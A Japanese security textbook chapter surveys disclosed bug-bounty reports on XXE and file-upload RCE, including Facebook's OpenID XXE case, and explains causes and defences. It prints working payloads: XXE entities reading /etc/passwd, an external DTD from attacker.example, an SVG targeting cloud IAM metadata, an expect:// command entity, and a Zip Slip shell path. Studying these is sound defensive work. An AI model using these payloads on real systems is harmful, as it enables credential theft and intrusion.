# 第10章 実例・ライトアップ・報奨事例


## 報告集約リポジトリ（TOPXXE/TOPRCE）

本節では、HackerOneで公開されたレポートをupvote数・賞金額で機械的に集計している`reddelexc/hackerone-reports`リポジトリの`TOPXXE.md`・`TOPRCE.md`（および補助的に`TOPUPLOAD.md`）を素材に、XXE（XML External Entity、XML外部エンティティ）とファイルアップロード起点の脆弱性がどのように実戦で悪用されてきたかを、上位事例の技術的な仕組みとともに読み解く。あわせて`jaiswalakshansh/Facebook-BugBounty-Writeups`（Meta/Facebookバグバウンティのwriteup集）を確認し、この分野の報告傾向の偏りについても触れる。いずれも既に公開・修正済みのレポートであり、対象組織への追試や再現は行わない。読者が学ぶべきは個別の企業名ではなく、**同じ脆弱性クラスがどのパターンで繰り返し発生するか**という構造である。

### reddelexc/hackerone-reportsの位置づけ

`reddelexc/hackerone-reports`は「Top disclosed reports from HackerOne」を謳うリポジトリで、Pythonスクリプト（`fetcher.py`でHackerOneから収集、`uniquer.py`で重複排除、`filler.py`で情報補完、`rater.py`でランキング生成）によって定期的に自動更新されている。生データは`data.csv`に集約され、そこから脆弱性タイプ別（`docs/tops_by_bug_type/`）・プログラム別（`docs/tops_by_program/`）にMarkdownへ整形される。星6,500超・フォーク1,100超という規模から、脆弱性研究者の間で「まず読むべきキュレーション」として定着していることがわかる。本節で参照する`TOPXXE.md`・`TOPRCE.md`・`TOPUPLOAD.md`は、このリポジトリの`docs/tops_by_bug_type/`配下にある（リポジトリのREADME上の相対リンクは`tops_by_bug_type/`だが、実体は`docs/`ディレクトリ配下に置かれている点に注意。パスが変わることがあるため、必ず最新のディレクトリ構成を確認すること）。

> 出典: reddelexc/hackerone-reports — https://github.com/reddelexc/hackerone-reports

### TOPXXE.mdを読み解く：XXEの実戦傾向

`TOPXXE.md`の上位55件を通覧すると、対象企業には偏りがある一方で、**攻撃の技術的パターンはごく少数の型に収束する**ことがわかる。まず一覧の上位を抜粋する（2026年時点でのスナップショット。upvote・賞金は今後も変動しうる）。

| 順位 | タイトル | 対象プログラム | upvote | 賞金 |
|---|---|---|---|---|
| 1 | XXE at ecjobs.starbucks.com.cn/retail/hxpublic_v6/hxdynamicpage6.aspx | Starbucks | 319 | $0 |
| 2 | XXE on pulse.mail.ru | Mail.ru | 264 | $6,000 |
| 3 | XXE on sms-be-vip.twitter.com in SXMP Processor | X / xAI | 258 | $0 |
| 4 | XXE on https://duckduckgo.com | DuckDuckGo | 218 | $0 |
| 7 | Multiple endpoints are vulnerable to XML External Entity injection (XXE) | Pornhub | 138 | $2,500 |
| 10 | XXE Injection through SVG image upload leads to SSRF | Zivver | 112 | $0 |
| 12 | [RCE] Unserialize to XXE - file disclosure | Pornhub | 90 | $0 |

> 出典: reddelexc/hackerone-reports — TOPXXE.md — https://github.com/reddelexc/hackerone-reports/blob/master/docs/tops_by_bug_type/TOPXXE.md

以下、学びの多い5件を掘り下げる。

#### Starbucks: `.aspx`エンドポイントのXXE（319 upvotes, $0）

report #500515「XXE at ecjobs.starbucks.com.cn」は、`/retail/hxpublic_v6/hxdynamicpage6.aspx`および`/recruitjob/hxpublic_v6/hxdynamicpage6.aspx`という2つの`.aspx`（ASP.NET）エンドポイントが、ユーザーから送られてくるXMLをそのまま外部エンティティ有効の状態でパースしていたことが原因のXXEである。**なぜASP.NET系の古いエンドポイントでXXEが頻出するのか**という一般的な背景を補足すると、.NET Frameworkの`XmlDocument`クラスは歴史的に`XmlResolver`がデフォルトで有効（つまり外部エンティティの解決を許可する設定）になっていたバージョンが長く使われており、開発者が明示的に`XmlResolver = null`を設定しない限りXXEに対して脆弱なままになる。賞金が$0なのは、この報告がVDP（Vulnerability Disclosure Program、報奨金なしの脆弱性開示プログラム）のスコープだったためであり、重大度と報奨額が比例しない典型例でもある。319 upvotesという突出した支持数は、「巨大企業の求人・採用サブドメインという、本体サービスから見落とされがちな周辺システムに深刻な脆弱性が残っている」という教材的価値の高さを反映している。

#### Mail.ru: pulse.mail.ruのRSS/Atomパーサ経由XXE（264 upvotes, $6,000）

report #505947は、`pulse.mail.ru`のRSS/Atomフィード取り込み機能が、フィードXML中の外部エンティティを解決してしまうことでローカルファイルの読み取りに繋がった事例である。RSS/Atomはそもそも「外部から与えられたURLの内容をサーバーが能動的に取得してパースする」機能であり、次の2点が重なるとXXEの標的になりやすい。

1. RSSリーダー・アグリゲーター機能は、任意のURLからXMLを取得するため、**攻撃者が完全に内容を制御できるXML文書**をサーバーに解析させられる。
2. RSS/Atomのパースには多くの場合、汎用のXMLパーサライブラリがそのまま流用され、フィード専用の安全なサブセットパーサが使われていないことが多い。

典型的な攻撃ペイロードは以下のような形になる。

```xml
<?xml version="1.0"?>
<!DOCTYPE rss [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<rss version="2.0">
  <channel>
    <title>&xxe;</title>
    ...
  </channel>
</rss>
```

**なぜこれでファイルの中身が読めるのか。** XML 1.0仕様は、DTD（Document Type Definition、文書の構造を定義する宣言部）内で`<!ENTITY 名前 SYSTEM "URI">`という形式の外部一般実体（external general entity）を宣言できる。パーサがこの宣言を許可した状態で文書本体中に`&xxe;`という参照を書くと、パーサは指定されたURI（ここでは`file://`スキームでローカルファイルパス）の内容を取得し、参照箇所にそのまま展開してから残りの処理を続行する。結果として、パース後に生成される値（この例では`<title>`要素の値）に`/etc/passwd`の中身がそのまま埋め込まれ、それがアプリケーションのレスポンスや後続処理（フィードのタイトル表示など）を通じて攻撃者に見えてしまう。$6,000という高額な賞金は、単なるDoSではなく機密ファイルの直接窃取（in-band、レスポンスに結果がそのまま返る形式）に到達したことを反映している。

> 出典: reddelexc/hackerone-reports — TOPXXE.md — https://github.com/reddelexc/hackerone-reports/blob/master/docs/tops_by_bug_type/TOPXXE.md
> 出典: Mail.ru disclosed on HackerOne — Report #505947 — https://hackerone.com/reports/505947

#### DuckDuckGo: `x.js`の`u`パラメータ経由XXEとその修正バイパス（218 upvotes / 159 upvotes）

report #483774は、`duckduckgo.com`の`x.js`エンドポイントが`u`パラメータ経由で受け取るXMLを外部エンティティ有効のまま解析していたことによるXXEである。特筆すべきは、この報告に対して一度パッチが適用された後、**同じ研究者が修正の不備を突いてブラインドXXE（レスポンスに直接結果が現れず、外部通信の発生有無だけで判定するXXE）でのバイパス**を追加報告している点である（report #486732、「Partial bypass of #483774 with Blind XXE」）。これは、XXE対策として「危険な外部実体参照だけを個別にブロックする」フィルタ的な修正では不十分であり、**外部実体解決そのものをパーサレベルで無効化しない限り、別のペイロード変種（パラメータ実体、CDATA併用、異なるプロトコルスキームなど）で再発しうる**ことを示す好例である。

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.example/evil.dtd">
  %xxe;
]>
```

これはパラメータ実体（`%`で始まる、DTD内でのみ参照可能な実体）を使い、外部の悪意あるDTDファイルを読み込ませる手法である。レスポンスに結果が直接出ないブラインドXXEの場合、この外部DTD内でさらにファイル内容をOOB（Out-of-Band、帯域外）チャネル経由——典型的には攻撃者が用意したサーバーへのDNSクエリやHTTPリクエストとして——exfiltrate（外部への持ち出し）するテクニックが使われる。攻撃者はサーバーのアクセスログやDNSクエリログを監視するだけで、レスポンスを介さずファイル内容を断片的に復元できる。

> 出典: reddelexc/hackerone-reports — TOPXXE.md — https://github.com/reddelexc/hackerone-reports/blob/master/docs/tops_by_bug_type/TOPXXE.md
> 出典: DuckDuckGo disclosed on HackerOne — Report #483774, #486732 — https://hackerone.com/reports/483774 , https://hackerone.com/reports/486732

#### Pornhub: 複数エンドポイントにまたがるXXE（138 upvotes, $2,500）

report #72272「Multiple endpoints are vulnerable to XML External Entity injection (XXE)」は、単一のエンドポイントではなく**アプリケーション内の複数箇所で同種のXXEが横断的に存在していた**ことを示す報告で、任意のリクエストをプロダクションサーバー起点で送信できる（SSRF的な影響を含む）ことが評価され$2,500の報奨に至っている。同社では別途report #142562「[RCE] Unserialize to XXE - file disclosure」も上位に入っており、これはPHPの`unserialize()`（シリアライズされた文字列からオブジェクトを復元する関数）に渡すデータの中にXML関連クラス（SimpleXMLElementなど）のシリアライズ表現を紛れ込ませることで、**デシリアライズ処理の副作用としてXXEを引き起こす**、いわゆる「PHPオブジェクトインジェクション経由のXXE」パターンである。この手法の核心は、アプリケーションが「XMLを直接パースしていない」つもりでも、内部で使われているシリアライズ/デシリアライズの仕組みがXMLパーサを暗黙に呼び出していれば、入力経路のフィルタリングをすり抜けてXXEが成立しうるという点にある。**入力の型（フォームなのかJSONなのかシリアライズ文字列なのか）ではなく、最終的にどのパーサ・ライブラリに到達するか（sink、入力が最終的に危険な形で処理される到達点）で脆弱性の有無を判断する必要がある**ことを示す教材的な事例である。

> 出典: reddelexc/hackerone-reports — TOPXXE.md — https://github.com/reddelexc/hackerone-reports/blob/master/docs/tops_by_bug_type/TOPXXE.md
> 出典: Pornhub disclosed on HackerOne — Report #72272, #142562 — https://hackerone.com/reports/72272 , https://hackerone.com/reports/142562

#### Zivver: SVGアップロード経由のXXE→SSRF（112 upvotes, $0）

report #897244は、プロフィール画像としてSVG画像をアップロードできる機能が、**SVGファイルの中身をXMLとしてサーバー側で解析（サムネイル生成やメタデータ抽出のため）する際に外部エンティティを解決してしまう**ことによるXXEで、最終的にSSRF（Server-Side Request Forgery、サーバーに任意の内部/外部リクエストを送らせる攻撃）に到達した。SVGは仕様上XML 1.0のサブセットであり、画像フォーマットであると同時に完全なXML文書でもあるため、**「画像アップロード機能」という一見XMLと無関係な入口が、実はXXEの入口になりうる**という、本教科書のテーマ（XXE×ファイルアップロード）を最も直接的に体現する事例である。典型的な悪用ペイロードは次のような形になる。

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<svg width="128px" height="128px" xmlns:xlink="http://www.w3.org/1999/xlink"
     xmlns="http://www.w3.org/2000/svg" version="1.1">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

**なぜこれがSSRFにまで到達するのか。** XXEの外部実体参照は`file://`スキームに限らず、`http://`・`https://`など任意のURIスキームを指定できる。パーサがネットワークアクセス可能な環境で動作していれば、サーバー自身に指定URLへのリクエストを発行させることができ、これは古典的なSSRFと等価な効果を持つ。上記ペイロードはクラウド環境のメタデータエンドポイント（多くのクラウドプロバイダが`169.254.169.254`というリンクローカルアドレスでインスタンスメタデータ・一時認証情報を提供する仕組み）を狙う定型パターンで、成功すればサーバーが動いているクラウド環境の一時的なIAM認証情報がSVGのレンダリング結果（テキスト要素の内容）としてそのまま画面や生成画像に露出する。SVGアップロード機能を提供するサービスでは、アップロード直後のサムネイル生成やプレビュー処理が「サーバー内部で信頼された処理」として扱われがちで、外部入力に対する警戒が薄れやすい点が、この種の脆弱性が繰り返し発生する根本原因である。

> 出典: reddelexc/hackerone-reports — TOPXXE.md — https://github.com/reddelexc/hackerone-reports/blob/master/docs/tops_by_bug_type/TOPXXE.md
> 出典: Zivver disclosed on HackerOne — Report #897244, "XXE Injection through SVG image upload leads to SSRF" — https://hackerone.com/reports/897244

### TOPRCE.md / TOPUPLOAD.mdに見る「ファイルアップロード起点RCE」の型

`TOPRCE.md`（上位158件）と`TOPUPLOAD.md`（アップロード関連に特化した集計）を突き合わせると、ファイルアップロード機能を起点とするRCEには大きく次の3系統があることが読み取れる。

1. **アップロードしたファイルがそのままWebサーバーの実行可能領域に配置され、直接実行される**（Webシェル型）
2. **アップロードしたファイルをサーバー側の処理系（画像変換・メタデータ処理・展開処理など）に渡した結果、その処理系自体の脆弱性が誘発される**（処理系脆弱性誘発型）
3. **アップロードを足がかりに、SSRFなど別クラスの脆弱性と連鎖させて内部コンポーネントを攻撃する**（連鎖型）

#### Webシェル型: Starbucks「ecjobs.starbucks.com.cn」（688 upvotes, $0）

`TOPUPLOAD.md`第2位のreport #506646「Webshell via File Upload on ecjobs.starbucks.com.cn」は、同じStarbucksの求人サブドメインで、アップロードされたファイルの拡張子・内容種別の検証が不十分なまま、Webサーバーがスクリプトとして実行できる領域に保存されてしまうという、ファイルアップロード脆弱性の最も基本的かつ最も破壊力の大きいパターンである。**なぜ拡張子チェックだけでは不十分なのか**という原則は、サーバー側の実行判定がしばしば「拡張子」ではなく「Content-Type」や「サーバー設定（例: Apacheの`AddHandler`、IISのハンドラマッピング）」に依存しており、`.php`を弾いても`.phtml`・`.pht`・大文字小文字違い・二重拡張子（`.jpg.php`）・null byteによる拡張子切り詰めなど、検証ロジックの想定漏れを突く変種が非常に多いためである。

#### 処理系脆弱性誘発型: GitLab「ExifTool経由のRCE」（508 upvotes, $20,000）

report #1154542「RCE when removing metadata with ExifTool」は、ユーザーがアップロードした画像からメタデータ（Exif情報）を除去する機能が、内部で呼び出しているExifToolというサードパーティツールの脆弱性（DjVuファイル形式のパース処理に起因する既知の深刻な脆弱性、CVE-2021-22204として公表）を誘発し、任意コード実行に到達した事例である。**このパターンの本質は、アプリケーション自身のコードに直接の脆弱性がなくても、「アップロードされたファイルを解釈する依存ライブラリ」が攻撃対象になる**という点にある。防御側の観点では、アップロードされたファイルを処理するあらゆる外部ツール・ライブラリ（画像変換、PDF生成、アーカイブ展開、メタデータ抽出、ウイルススキャン等）のバージョンを常に最新に保ち、既知のCVEを追跡することが、アプリケーションコードのレビューと同格の重要度を持つ。

#### 連鎖型: Aiven「Kafka Connect経由のRCE」（56 upvotes, $5,000）

report #1547877「[Kafka Connect] RCE by leveraging file upload via SQLite JDBC driver and SSRF to internal Jolokia」は、ファイルアップロード・SSRF・内部監視エンドポイントの3つを連結させた高度な攻撃連鎖である。手順を整理すると次の通りである。

1. JDBC Sink Connector（Kafkaのメッセージを外部データベースに書き込む機能）が同梱するSQLite JDBCドライバの機能を悪用し、**任意のSQLiteデータベースファイルをサーバー上の任意パスにアップロード（書き込み）**する。
2. HTTP Sink Connectorを使い、サーバー自身に`localhost`宛てのHTTPリクエストを発行させる（SSRF）。
3. `localhost:6725`で保護なしに待ち受けていたJolokia（JMX、Java Management Extensionsの情報をHTTP経由で公開するツール）のエンドポイントに対し、`com.sun.management:type=DiagnosticCommand` MBeanが持つ`jvmtiAgentLoad`という操作（任意のネイティブエージェント/JARをロードできる機能）を呼び出す。
4. 手順1でアップロード済みの悪意あるJARファイルをロードさせ、リモートコード実行に至る。

**この事例が示す重要な原則は、「ファイルアップロード」「SSRF」「内部管理エンドポイントの認証欠如」という個別には中〜高程度の脆弱性が、組み合わさることでクリティカルなRCEに変貌する**という点である。単体のバグバウンティレポートとして評価する際も、防御側の脅威モデリングにおいても、「この脆弱性単体の影響は限定的だから優先度を下げる」という判断は、他の脆弱性との連鎖可能性を考慮しないと誤りうる。

> 出典: reddelexc/hackerone-reports — TOPRCE.md / TOPUPLOAD.md — https://github.com/reddelexc/hackerone-reports/blob/master/docs/tops_by_bug_type/TOPRCE.md , https://github.com/reddelexc/hackerone-reports/blob/master/docs/tops_by_bug_type/TOPUPLOAD.md
> 出典: GitLab disclosed on HackerOne — Report #1154542 — https://hackerone.com/reports/1154542
> 出典: Aiven Ltd disclosed on HackerOne — Report #1547877 — https://hackerone.com/reports/1547877

### Facebook BugBounty Writeups集：XXEレポートの不在が示すもの

`jaiswalakshansh/Facebook-BugBounty-Writeups`は、2019年以降のMeta（Facebook/Instagram/WhatsApp）バグバウンティwriteupを年別に集約したキュレーションリポジトリで、著者名・報奨額・公開日とともに数百件のリンクが整理されている。このリポジトリ全体を通覧すると、**XXEを明示的なテーマとするwriteupは見当たらない**。これは偶然ではなく、Metaのバックエンドの多くがThrift/Protocol Buffersなどバイナリベースのシリアライズプロトコルを内製で多用しており、外部から与えられる生のXMLを汎用XMLパーサで直接処理する経路自体が構造的に少ないためだと考えられる（一般的傾向としての推測であり、Meta社内の実装詳細が公開されているわけではない）。この事実自体が読者への教訓になる。**XXEは「XMLパーサに到達する入力経路がどれだけ存在するか」に強く依存する脆弱性クラス**であり、SOAP API、Office文書（docx/xlsx等はZIP+XMLの複合フォーマット）、SVGアップロード、RSS/Atom取り込み、SAML認証（SAMLアサーションはXML）など、XMLを前提とした機能を多用する組織ほど攻撃対象領域が広がる。逆に言えば、脆弱性調査に着手する際は、対象サービスが「どこでXMLを受け取っているか」（Content-Typeが`application/xml`/`text/xml`のエンドポイント、拡張子が`.xml`/`.svg`/`.docx`等のファイルアップロード、SAML SSOのコールバック等）を棚卸しすることが、XXEハンティングの出発点になる。

一方で同リポジトリには、ファイルアップロード×アーカイブ処理に関連する事例として、report「Meta's SparkAR RCE Via ZIP Path Traversal」（Fady Othman、2022年4月7日公開、$2,500）が掲載されている。これはSparkAR（Meta製のARエフェクト開発ツール）が受け取るプロジェクトファイル（ZIPアーカイブ形式）の展開処理で、ZIP内のエントリ名にパストラバーサル文字列（`../../`等）を含めることで、展開先を本来のディレクトリ外に逃がし、任意パスへのファイル書き込みからRCEに至った事例である。これはいわゆる「Zip Slip」と呼ばれる既知の脆弱性パターン（2018年にSnykが体系的に報告し広く知られるようになった）で、**アーカイブ展開処理を実装する際は、各エントリの展開先パスを正規化した上で、必ず展開先ベースディレクトリの内側に収まっているかを検証しなければならない**という、ファイルアップロード機能の防御実装における基本原則を再確認させる事例である。

```
# Zip Slipの典型的な悪性エントリ名（概念例。実サービスへの適用・検証は行わないこと）
../../../../var/www/html/shell.php
```

> 出典: jaiswalakshansh/Facebook-BugBounty-Writeups — https://github.com/jaiswalakshansh/Facebook-BugBounty-Writeups
> 出典: Meta's SparkAR RCE Via ZIP Path Traversal — Fady Othman — https://blog.fadyothman.com/metas-sparkar/

### まとめ：報告集約リポジトリから読み取るべき実務上の示唆

以上の事例を横断して整理すると、次の3点が実務上の要点となる。

- **XXEは「XMLを直接送信するAPI」だけでなく、SVGアップロード・Office文書解析・RSS取り込みなど、間接的にXMLパーサへ到達する経路すべてが攻撃対象になる。** パーサレベルでの外部実体解決の無効化（`XmlResolver = null`相当の設定、libxml2の`LIBXML_NOENT`を使わない、DTD処理自体を無効化する等）が唯一の確実な対策であり、個別ペイロードのブラックリスト的フィルタは再発を防げない（DuckDuckGoの修正バイパス事例が示す通り）。
- **ファイルアップロード起点のRCEは、アプリケーション自身のコードだけでなく、アップロードされたファイルを処理する依存ライブラリ・外部ツール（画像変換、メタデータ抽出、アーカイブ展開）のサプライチェーン全体が攻撃対象になる。** バージョン管理とCVE追跡が、コードレビューと同等以上に重要である。
- **個別には中程度に見える脆弱性（アップロード権限、SSRF、内部管理ポートの認証欠如）も、連鎖させると致命的なRCEになりうる。** Aiven/Kafka Connectの事例のように、脅威モデリングは単一の脆弱性の影響度だけでなく、他の弱点との組み合わせ可能性まで含めて評価する必要がある。

これらのリポジトリは日々更新されるため、本節で示した順位・upvote数・賞金額はあくまで取得時点のスナップショットである。継続的な学習には、`reddelexc/hackerone-reports`をウォッチ登録し、新規に上位入りしたレポートを定期的に確認することを推奨する。

## Facebook OpenID XXE→RCE（$33,500）

2013年、ブラジルの研究者 Reginaldo Silva は、Facebook の OpenID（外部の Identity Provider にログインを委任する仕組み）実装に XXE（XML External Entity injection: XML の外部実体宣言を悪用して、パーサに任意のファイルやネットワークリソースを読み込ませる攻撃）を発見し、最終的に RCE（Remote Code Execution: 任意コード実行）相当の脅威として認定させ、当時の Facebook 史上最高額となる $33,500 の報奨金を獲得した。本節はこの一件を、発見の起点となった OpenID の仕様理解から、報告〜修正〜増額までの時系列、そして「XXE がなぜ RCE にまで化けうるのか」という原理まで掘り下げる。

### 発端：DrupalのOpenID実装で見つけたXXE

Silva の調査は Facebook から始まったのではない。2012年9月22日、彼は CMS（Content Management System）である Drupal の OpenID モジュールに XXE 脆弱性（CVE-2012-4554）を発見した。OpenID はユーザーが自前でパスワードを管理せず、Google や Yahoo などの Identity Provider（IdP: 認証を代行するサービス）に認証を委任するためのプロトコルで、当時は多くのサイトがログイン手段の一つとして採用していた。

OpenID のログインフローでは、Relying Party（RP: OpenID を使ってログインを受け付ける側、ここでは Drupal や Facebook）が、ユーザーの Claimed Identifier（本人が主張するIdPのURL）に対して XRDS（Extensible Resource Descriptor Sequence）という XML 文書を取得し、そこに書かれた IdP のエンドポイントを信頼してよいかを検証する「Discovery（発見）」処理を行う。この XRDS 文書をパースする際に外部実体の展開を許してしまうサーバが多数存在した。Silva はこれを「billion laughs（実体の入れ子展開によるDoS）」だけでなく、任意ファイル読み取りやSSRF（Server-Side Request Forgery: サーバに任意の宛先へ通信させる攻撃）に使えることを示した。

発見からわずか5日後、彼は同種の脆弱性が StackOverflow、Google App Engine、Blogger にも存在することを確認し、**Java、C#、PHP、Ruby、Python、Perl という複数言語のOpenID実装が同じ設計ミスを繰り返していた**ことを突き止めた。これは「XXEは特定言語の実装バグではなく、XMLパーサのデフォルト設定と、外部実体解決を必要とするプロトコル設計の組み合わせが生む構造的な問題である」ことを示す好例であり、本教科書がXXEを繰り返し「パーサ側のデフォルト設定」の問題として扱う理由でもある。

### Facebookへの適用：パスワード再設定に眠っていたOpenID経路

一般に「Facebook は OpenID ログインをやめたはずでは」と思われがちだが、Silva はここに着目した。Facebook はかつてサードパーティのOpenIDログインを提供しており、その名残として**パスワード再設定（忘却）フロー**の中に、Gmail 経由の OpenID 認証を使う経路が残っていた。表向きの導線からは見えなくなっていても、バックエンドの処理コードとエンドポイントは生きていた、という点が重要である。これは攻撃対象領域（attack surface）を洗い出す際、「UIから見える機能」だけでなく「過去に存在し廃止されたはずの機能の残骸」まで確認すべきという教訓になる。

技術的な鍵は OpenID 2.0 仕様の Section 11.2 にある。仕様は次のように定める（原文引用）。

> "If the Claimed Identifier was not previously discovered by the Relying Party ... the Relying Party MUST perform discovery on the Claimed Identifier in the response to make sure that the OP is authorized to make assertions about the Claimed Identifier"

Silva はこれを逆手に取った。ログイン応答パラメータの `openid.identity` に、仕様上の特殊値である `http://specs.openid.net/auth/2.0/identifier_select` をセットすることで、Facebook 側に「Claimed Identifier がまだ発見（discover）されていない」と判断させ、**攻撃者が指定した任意のURL（=攻撃者のサーバ）に対して Yadis Discovery（IdPのケイパビリティを記したXRDS文書を取得しに行く処理）を実行させる**ことに成功した。つまり、Facebook のサーバ自身に「攻撃者が用意した悪意あるXML文書」を取得・パースさせる導線を作り出したのである。これはSSRF（サーバに任意通信をさせる）とXXE（取得したXMLを危険な設定でパースさせる）が連結した典型的な攻撃チェーンで、単体では中〜高リスクの脆弱性同士が組み合わさることでクリティカルな脅威に格上げされる好例である。

> 出典: Reginaldo Silva「How I found a Remote Code Execution bug affecting Facebook's servers」— https://www.ubercomp.com/posts/2014-01-16_facebook_remote_code_execution

### 実証：/etc/passwdの読み取りとペイロード非公開の判断

Silva は攻撃者サーバに悪意あるXRDS（XML）文書を設置し、Facebook のOpenID発見処理にそれを取得・パースさせることで、レスポンス中に `/etc/passwd` の内容を混入させることに成功した。`/etc/passwd` はUnix系OSでユーザーアカウント一覧を保持するファイルであり、機密情報そのものではないものの、「サーバ側で任意のローカルファイルを読み取れる」ことの動かぬ証拠(PoC: Proof of Concept)として業界で広く使われる。これによりファイルシステムへの任意読み取りが実証された。

ここで一点、教材として重要な注記がある。原著者は記事中で、**用いたXMLペイロードの正確な中身、およびファイル読み取りをRCEへ発展させた具体的な技術手順を、意図的に公開しなかった**。理由として「(執筆時点である2014年1月の時点でも)多くのサーバが同種の脆弱性に対して依然脆弱であるため」と明言している。これは倫理的な開示判断の実例であり、責任ある開示(Responsible Disclosure)の実務において「技術的に再現可能な詳細をどこまで公開してよいか」を判断する際の一つの基準（実環境への影響が続く限り、実戦投入可能な詳細は伏せる）として参考になる。

> ⚠️ **未取得の資料の一部について**: 原著者はXXE→RCEの具体的な変換手順（ペイロードの実物）を記事内で意図的に開示していません。したがって本節でもその正確な手順は再現しません。以下は一般知識に基づく補足です。

（以下は一般知識に基づく仕組みの解説です）XXEからRCEへ発展させる代表的な技術として広く知られているのは、PHPの `expect` 拡張が有効な環境で使える `expect://` ストリームラッパ（stream wrapper: ファイルパスの代わりにプロトコル名を指定することで、ファイルI/Oの裏で別の処理を差し込めるPHP独自の仕組み）を external entity の宛先に指定する手法である。

```xml
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<root>&xxe;</root>
```

- 通常、external entity の `SYSTEM` にはファイルパスやURLを書くが、`expect://` はプロトコルハンドラとして「後続の文字列をOSコマンドとして実行し、その標準出力をストリームとして返す」という挙動を持つ。
- **なぜこれが成立するのか**：PHPのストリームラッパ機構は `scheme://path` という表記があれば、`scheme` に登録されたハンドラへ処理を委譲する。XMLパーサ（libxml2など）は「ファイルを開いて読む」というAPIしか呼んでいないつもりでも、内部的にはPHPのストリーム層を経由するため、`expect` 拡張が読み込まれていれば任意コマンド実行の窓口として機能してしまう。
- ただし `expect` はPHPのデフォルトでは無効化されている拡張であり、任意の環境で通用する万能手法ではない。Facebookの事案でSilvaが実際にこの手法を使ったのか、あるいは別の内部的な仕組み（管理者向け機能の悪用など、Facebook側が後に「a valid administrative feature scenario」として言及した経路）を使ったのかは、公開情報からは断定できない。

この不確実性自体が学びになる。「ファイル読み取りが取れた」時点で攻撃を止めず、**その先にRCEへ繋がる経路が存在するかどうかを、権限のある報告先（バグバウンティ運営）と協調しながら慎重に検証する**姿勢が、正当な倫理的ハッキングの実務では求められる。実在システムに対して無許可でRCEへの昇格を試みることは、本教科書のスコープ外であり推奨しない。

### 報告からパッチ、報奨金確定までの時系列

Silva の記事には、Facebook セキュリティチームとのやり取りが分単位で記録されている。抜粋すると以下の通りである。

| 日時（2013年） | 出来事 |
|---|---|
| 11月19日 15:51 | 初回報告を送付 |
| 11月19日 17:37 | Facebookチームが受領を確認 |
| 11月19日 17:46 | `/etc/passwd` 読み取りのPoCを追加送付 |
| 11月19日 19:31 | 短期的な緩和策が約30分以内に完了する見込みとの連絡 |
| 11月19日 20:27 | 暫定パッチの適用を確認 |
| 11月21日 20:03 | Facebookが（当時としては）最大級の報奨金額を提示 |
| 11月23日 01:17 | RCEへの発展可能性についての検討が始まる |
| 11月24日 21:23 | RCE相当の脅威として有効性が確認される |
| 12月3日 04:45 | 恒久的な修正が完了 |
| 12月30日 04:45 | RCE認定に伴う報奨金の増額が最終通知される |

この時系列から読み取れる実務上のポイントは二つある。第一に、Facebookは初期報告からわずか数時間で暫定的な緩和策（ブロックルール）を投入している。これは根本修正（コードレベルでのXMLパーサ設定変更）に先立ち、境界（エッジ）で危険なリクエストパターンを検知・遮断する「仮の防御」を即座に挟む、実運用でよく使われる被害最小化の手順である。第二に、脆弱性の深刻度評価（severity）はワンショットでは決まらず、報告後の追加調査（この場合はファイル読み取りからRCEへの昇格可能性の検証）によって**後から引き上げられ、報奨金も増額される**ことがある。バグバウンティにおいて、初回トリアージの評価額が最終額と一致するとは限らない典型例である。

Facebook側の対応について、The Hacker News はさらに次の点を報じている。即時パッチには "Takedown" と呼ばれる社内ツールが使われ、これは通常のアプリケーション処理より低いレイヤーで動作し、「エンジニアがリクエストのブロック・ログ記録・改変ルールを定義できる」機能を持つ。つまりコードを直接修正する前に、リバースプロキシ層やWAF（Web Application Firewall）に相当する仕組みで悪性パターンを即座に遮断する、という多層防御の実例である。

> 出典: The Hacker News「Facebook Hacker received $33,500 reward for RCE」— https://thehackernews.com/2014/01/facebook-hacker-received-33500-reward.html

### 報奨金額とその意味

最終的な報奨額は $33,500 で、Facebookは公式に「自社バグバウンティ史上最大の支払い」と表明した。Silva自身は記事内で、一部で噂された「$100万ドル」という金額には達しなかったと明記している。金額そのものよりも重要なのは、**「ファイル読み取り」という単体では中程度に評価されがちな脆弱性が、RCEへの昇格可能性が示されたことで報奨額が跳ね上がった**という構造である。これはバグレポートを書く側にとっての実務的な示唆でもある。発見した脆弱性の「到達しうる最悪のシナリオ」まで（安全に、許可された範囲で）示すことができれば、深刻度の再評価につながりうる。

> 出典: The Hacker News「Facebook Hacker received $33,500 reward for RCE」— https://thehackernews.com/2014/01/facebook-hacker-received-33500-reward.html

### この事例から得られる教訓

1. **OpenID/SAMLなどXMLベースの認証連携プロトコルは、Discovery・Metadata取得の段階でXXEが混入しやすい。** RPがIdP情報を検証するために外部リソースを取得・パースする設計そのものが、攻撃者制御下のXML文書をパーサに通す機会を作り出す。
2. **「使われなくなった機能」は攻撃対象領域から消えない。** Facebookのケースでは、表向き廃止されたOpenIDログインが、パスワード再設定フローの奥に生き残っていた。
3. **脆弱性の深刻度は静的ではない。** 初期の「ファイル読み取り」評価が、後続調査でRCE相当と判明し、報奨金が数倍規模で見直された。
4. **原著者が実際に脆弱性の核心的な再現手順（本件ではRCEへの具体的な変換手順）を意図的に伏せる判断は、影響が残存する期間の責任ある開示の一形態である。** 本教科書も同じ立場を取り、実在システムを想定した攻撃的な手順の再現は行わない。
5. **即時の緩和策（境界でのブロック）と恒久的な修正（コード修正）は別物であり、前者は後者までの時間を稼ぐための応急処置に過ぎない。** 防御側は両方を用意しておく必要がある。

## Facebook Careers DOCX Blind XXE（Ramadan）

本節では、エジプトのセキュリティ研究者 Mohamed Ramadan 氏が2014年7月にFacebookの採用サイト（Facebook Careers）で発見した「DOCXファイルによるブラインドXXE」の事例を取り上げる。この事例は、Word文書（.docx）を受け付ける一般的な「履歴書アップロード」機能が、実はXML外部実体（External Entity）を注入できる攻撃面になり得ることを世に知らしめた、実務上きわめて示唆に富むケースである。攻撃対象システムに直接ファイル内容を表示させることができない「盲目（ブラインド）」な状況で、どのように外部へデータを持ち出す（アウトオブバンド／OOB）かという手法の教科書的な実例でもある。

### 事案の概要

- **発見者**: Mohamed Ramadan氏（エジプト在住のセキュリティ研究者。過去にもFacebookのiOSカメラアプリやAndroidアプリの脆弱性を発見した実績を持つ）
- **発見時期**: 2014年7月
